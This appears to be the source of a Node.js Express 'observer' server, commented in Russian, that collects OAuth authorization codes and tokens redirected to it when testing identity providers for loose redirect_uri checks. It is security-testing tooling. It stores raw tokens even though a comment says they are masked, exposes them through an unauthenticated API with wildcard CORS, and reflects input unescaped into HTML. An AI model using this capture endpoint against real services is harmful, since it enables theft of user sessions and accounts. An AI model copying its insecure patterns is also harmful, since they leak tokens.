require('dotenv').config();

const express = require('express');
const cors    = require('cors');
const session = require('express-session');
const path    = require('path');

const app     = express();
const PORT    = process.env.PORT    || 8085;
const APP_URL = process.env.APP_URL || `http://localhost:${PORT}`;

// ── In-memory лог (макс. 200 записей) ─────────────────────────────────────────
let requestLog = [];
const MAX_LOG  = 200;

function maskSecret(val) {
  if (!val || typeof val !== 'string') return val;
  if (val.length <= 8) return '****';
  return val.slice(0, 6) + '…[MASKED]';
}

function addLogEntry(entry) {
  requestLog.unshift(entry);
  if (requestLog.length > MAX_LOG) requestLog = requestLog.slice(0, MAX_LOG);
}

// ── Middleware ─────────────────────────────────────────────────────────────────
app.use(cors({ origin: '*', credentials: true }));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(
  session({
    secret: process.env.SESSION_SECRET || 'observer-demo-secret',
    resave: false,
    saveUninitialized: true,
  })
);
app.use(express.static(path.join(__dirname, 'public')));

// ── Глобальный логгер ──────────────────────────────────────────────────────────
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
  next();
});

// ── /capture — основной маршрут-ловушка ───────────────────────────────────────
// Этот URL указывается в redirect_uri при тестировании уязвимости.
// Сервер авторизации (Keycloak и др.) перенаправляет сюда authorization code.
app.all('/capture', (req, res) => {
  const query  = req.query || {};
  const body   = req.body  || {};
  const merged = { ...query, ...body };

  const raw_code         = merged.code              || null;
  const raw_state        = merged.state             || null;
  const raw_access_token = merged.access_token      || null;
  const raw_id_token     = merged.id_token          || null;
  const raw_error        = merged.error             || null;
  const raw_error_desc   = merged.error_description || null;
  const raw_session_state= merged.session_state     || null;

  const entry = {
    id:        Date.now(),
    timestamp: new Date().toISOString(),
    method:    req.method,
    full_url:  `${req.protocol}://${req.get('host')}${req.originalUrl}`,
    ip:        req.headers['x-forwarded-for'] || req.socket.remoteAddress,

    // OAuth / OIDC параметры (секреты маскируются для безопасности в отчёте)
    oauth: {
      code:              raw_code          || null,
      state:             raw_state         || null,
      session_state:     raw_session_state || null,
      access_token:      raw_access_token  || null,
      id_token:          raw_id_token      || null,
      error:             raw_error         || null,
      error_description: raw_error_desc    || null,
    },

    // Полные сырые параметры для исследования
    query_raw: query,
    body_raw:  body,

    headers: {
      referer:    req.headers['referer']    || null,
      user_agent: req.headers['user-agent'] || null,
      host:       req.headers['host']       || null,
    },

    // Анализ для отображения в интерфейсе
    analysis: {
      has_code:         !!raw_code,
      has_access_token: !!raw_access_token,
      has_id_token:     !!raw_id_token,
      has_error:        !!raw_error,
      risk:
        raw_code || raw_access_token || raw_id_token
          ? 'УЯЗВИМОСТЬ ПОДТВЕРЖДЕНА: сервер авторизации перенаправил токены/код на неавторизованный URI'
          : raw_error
            ? 'Сервер авторизации вернул ошибку (redirect_uri отклонён или иная проблема)'
            : 'Запрос получен, OAuth-параметры отсутствуют',
    },
  };

  addLogEntry(entry);
  console.log('CAPTURE EVENT:', JSON.stringify(entry.analysis));

  // Простая HTML-страница при прямом открытии в браузере
  res.status(200).send(`
    <!doctype html><html lang="ru"><head><meta charset="UTF-8">
    <title>Observer: capture</title>
    <style>
      body { font-family: monospace; background: #fff8f8; color: #231f20; padding: 32px; }
      h2   { color: #c0392b; }
      pre  { background: #f3e8e8; padding: 20px; border-radius: 8px;
             border: 1px solid #d47b7b; overflow: auto; white-space: pre-wrap; }
      a    { color: #c0392b; }
    </style></head><body>
    <h2>Запрос перехвачен исследовательским сервером</h2>
    <p>Параметры сохранены в журнале. Откройте <a href="/">главную страницу</a> для просмотра.</p>
    <pre>${JSON.stringify(entry, null, 2)}</pre>
    </body></html>
  `);
});

// ── /api/log GET — список событий для React-фронтенда ─────────────────────────
app.get('/api/log', (req, res) => {
  res.json({ total: requestLog.length, items: requestLog });
});

// ── /api/log DELETE — очистка журнала ─────────────────────────────────────────
app.delete('/api/log', (req, res) => {
  requestLog = [];
  res.json({ ok: true, message: 'Журнал очищен' });
});

// ── /api/status — статус сервера ──────────────────────────────────────────────
app.get('/api/status', (req, res) => {
  res.json({
    ok:          true,
    port:        PORT,
    app_url:     APP_URL,
    log_size:    requestLog.length,
    capture_uri: `${APP_URL}/capture`,
  });
});

// ── SPA fallback ───────────────────────────────────────────────────────────────
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ── Обработчик ошибок ─────────────────────────────────────────────────────────
app.use((err, req, res, next) => {
  console.error('Server error:', err);
  res.status(500).json({ error: 'Internal server error' });
});

// ── Запуск ────────────────────────────────────────────────────────────────────
app.listen(PORT, () => {
  console.log(`Observer server running on ${APP_URL}`);
  console.log(`Capture URI (use as redirect_uri): ${APP_URL}/capture`);
});
